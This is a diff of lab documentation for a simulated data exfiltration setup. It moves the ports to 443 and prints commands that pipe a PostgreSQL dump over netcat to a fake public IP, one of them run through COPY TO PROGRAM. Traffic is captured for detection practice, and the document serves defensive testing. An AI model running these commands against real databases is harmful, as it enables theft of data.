@@ -20,7 +20,7 @@ This document describes the data exfiltration simulation setup in the Trident la
 │                                  │                          │
 │                            (NAT/DNAT)                      │
 │                                  │                          │
-│                        137.184.126.86:8000                  │
+│                        137.184.126.86:443                   │
 │                        (Fake Public IP)                    │
 └─────────────────────────────────────────────────────────────┘
 ```
@@ -36,7 +36,7 @@ This document describes the data exfiltration simulation setup in the Trident la
 2. **Router** (`lab_router` - 172.31.0.1)
    - Forwards traffic between networks
    - Applies DNAT rule to redirect "public" IP traffic locally
-   - Runs netcat listener on port 8000
+   - Runs netcat listener on port 443
    - Captures all traffic in PCAP files
    - Location: `images/router/`
 
@@ -65,13 +65,13 @@ This ensures that any attempt to connect to the "public" IP goes through the rou
 On the router, a DNAT (Destination NAT) rule redirects traffic:
 
 ```bash
-iptables-legacy -t nat -A PREROUTING -d 137.184.126.86 -p tcp --dport 8000 \
-  -j DNAT --to-destination 172.31.0.1:8000
+iptables-legacy -t nat -A PREROUTING -d 137.184.126.86 -p tcp --dport 443 \
+  -j DNAT --to-destination 172.31.0.1:443
 ```
 
 This rule:
-- Captures packets destined for `137.184.126.86:8000`
-- Rewrites the destination to `172.31.0.1:8000` (the router itself)
+- Captures packets destined for `137.184.126.86:443`
+- Rewrites the destination to `172.31.0.1:443` (the router itself)
 - Preserves the original destination in PCAP captures
 
 ### 3. Netcat Listener (Router)
@@ -79,13 +79,13 @@ This rule:
 The router runs a netcat listener to receive the data:
 
 ```bash
-nc -lvnp 8000 > /tmp/exfil/labdb_dump.sql
+nc -lvnp 443 > /tmp/exfil/labdb_dump.sql
 ```
 
 ### 4. Traffic Flow
 
 ```
-1. Server: pg_dump labdb | nc 137.184.126.86 666
+1. Server: pg_dump labdb | nc 137.184.126.86 443
    ↓
 2. Server routing table: Send to 172.31.0.1 (router)
    ↓
@@ -102,7 +102,7 @@ nc -lvnp 8000 > /tmp/exfil/labdb_dump.sql
 
 ```bash
 docker exec lab_server su - postgres -c \
-  'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 666'
+  'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 443'
 ```
 
 ### Method 2: PostgreSQL COPY with PROGRAM
@@ -110,7 +110,7 @@ docker exec lab_server su - postgres -c \
 ```bash
 docker exec lab_server su - postgres -c \
   'psql -c "COPY (SELECT 1) TO PROGRAM \
-    '\''sh -c \"pg_dump -U postgres labdb | nc 137.184.126.86 666\"'\'';"'
+    '\''sh -c \"pg_dump -U postgres labdb | nc 137.184.126.86 443\"'\'';"'
 ```
 
 ### Method 3: Manual connection from server
@@ -119,7 +119,7 @@ docker exec lab_server su - postgres -c \
 docker exec lab_server su - postgres -c \
   'pg_dump -U postgres labdb > /tmp/dump.sql'
 docker exec lab_server su - postgres -c \
-  'nc 137.184.126.86 666 < /tmp/dump.sql'
+  'nc 137.184.126.86 443 < /tmp/dump.sql'
 ```
 
 ## Retrieving Exfiltrated Data
@@ -154,7 +154,7 @@ psql -h localhost -U postgres -d labdb < labdb_clean.sql
 The router captures all traffic in `/outputs/<RUN_ID>/pcaps/`. The PCAP files will show:
 
 - **Source**: `172.31.0.10` (server)
-- **Destination**: `137.184.126.86:8000` (fake public IP)
+- **Destination**: `137.184.126.86:443` (fake public IP)
 - **Protocol**: TCP
 - **Content**: PostgreSQL database dump
 
@@ -163,11 +163,11 @@ The router captures all traffic in `/outputs/<RUN_ID>/pcaps/`. The PCAP files wi
 ```bash
 # View exfiltration traffic
 tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
-  -A 'host 137.184.126.86 and port 8000'
+  -A 'host 137.184.126.86 and port 443'
 
 # View connection establishment
 tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
-  'host 137.184.126.86 and port 8000'
+  'host 137.184.126.86 and port 443'
 
 # Count packets to exfil IP
 tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
@@ -177,7 +177,7 @@ tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
 ### Analyzing with Wireshark
 
 1. Open the PCAP file in Wireshark
-2. Filter: `ip.dst == 137.184.126.86 && tcp.port == 666`
+2. Filter: `ip.dst == 137.184.126.86 && tcp.port == 443`
 3. Follow TCP stream to see the database dump
 
 ## Automatic Setup
@@ -195,12 +195,12 @@ ip route add 137.184.126.86 via 172.31.0.1 dev eth0 2>/dev/null || true
 
 ```bash
 # Setup DNAT rule
-iptables-legacy -t nat -A PREROUTING -d 137.184.126.86 -p tcp --dport 8000 \
-  -j DNAT --to-destination 172.31.0.1:8000 2>/dev/null || true
+iptables-legacy -t nat -A PREROUTING -d 137.184.126.86 -p tcp --dport 443 \
+  -j DNAT --to-destination 172.31.0.1:443 2>/dev/null || true
 
 # Start netcat listener
 mkdir -p /tmp/exfil
-nc -lvnp 8000 > /tmp/exfil/labdb_dump.sql 2>/tmp/exfil/nc.log &
+nc -lvnp 443 > /tmp/exfil/labdb_dump.sql 2>/tmp/exfil/nc.log &
 ```
 
 ## Verification
@@ -216,21 +216,21 @@ docker exec lab_server ip route show | grep 137.184.126.86
 
 ```bash
 docker exec lab_router iptables-legacy -t nat -L PREROUTING -n -v | grep 137.184.126.86
-# Expected output: DNAT tcp -- * * 0.0.0.0/0 137.184.126.86 tcp dpt:8000 to:172.31.0.1:8000
+# Expected output: DNAT tcp -- * * 0.0.0.0/0 137.184.126.86 tcp dpt:443 to:172.31.0.1:443
 ```
 
 ### Verify Listener on Router
 
 ```bash
-docker exec lab_router ss -tlnp | grep 8000
-# Expected output: LISTEN 0 1 0.0.0.0:8000 0.0.0.0:* users:(("nc",pid=XXX,fd=3))
+docker exec lab_router ss -tlnp | grep 443
+# Expected output: LISTEN 0 1 0.0.0.0:443 0.0.0.0:* users:(("nc",pid=XXX,fd=3))
 ```
 
 ### Test Connection
 
 ```bash
-docker exec lab_server timeout 3 nc -zv 137.184.126.86 666
-# Expected output: Connection to 137.184.126.86 666 port [tcp/*] succeeded!
+docker exec lab_server timeout 3 nc -zv 137.184.126.86 443
+# Expected output: Connection to 137.184.126.86 443 port [tcp/*] succeeded!
 ```
 
 ## Security Use Cases
@@ -270,10 +270,10 @@ To use a different port (e.g., 443 for HTTPS simulation):
 
 ### Connection Refused
 
-**Problem**: `nc: connect to 137.184.126.86 port 8000 (tcp) failed: Connection refused`
+**Problem**: `nc: connect to 137.184.126.86 port 443 (tcp) failed: Connection refused`
 
 **Solution**:
-- Verify listener is running: `docker exec lab_router ss -tlnp | grep 8000`
+- Verify listener is running: `docker exec lab_router ss -tlnp | grep 443`
 - Check DNAT rule: `docker exec lab_router iptables-legacy -t nat -L PREROUTING -n -v`
 - Verify route: `docker exec lab_server ip route show | grep 137.184.126.86`
 
@@ -284,7 +284,7 @@ To use a different port (e.g., 443 for HTTPS simulation):
 **Solution**:
 - Check netcat log: `docker exec lab_router cat /tmp/exfil/nc.log`
 - Verify pg_dump works: `docker exec lab_server su - postgres -c 'pg_dump -U postgres labdb > /dev/null'`
-- Try simpler test: `docker exec lab_server sh -c 'echo "test" | nc 137.184.126.86 666'`
+- Try simpler test: `docker exec lab_server sh -c 'echo "test" | nc 137.184.126.86 443'`
 
 ### PCAP Shows Wrong IP
 
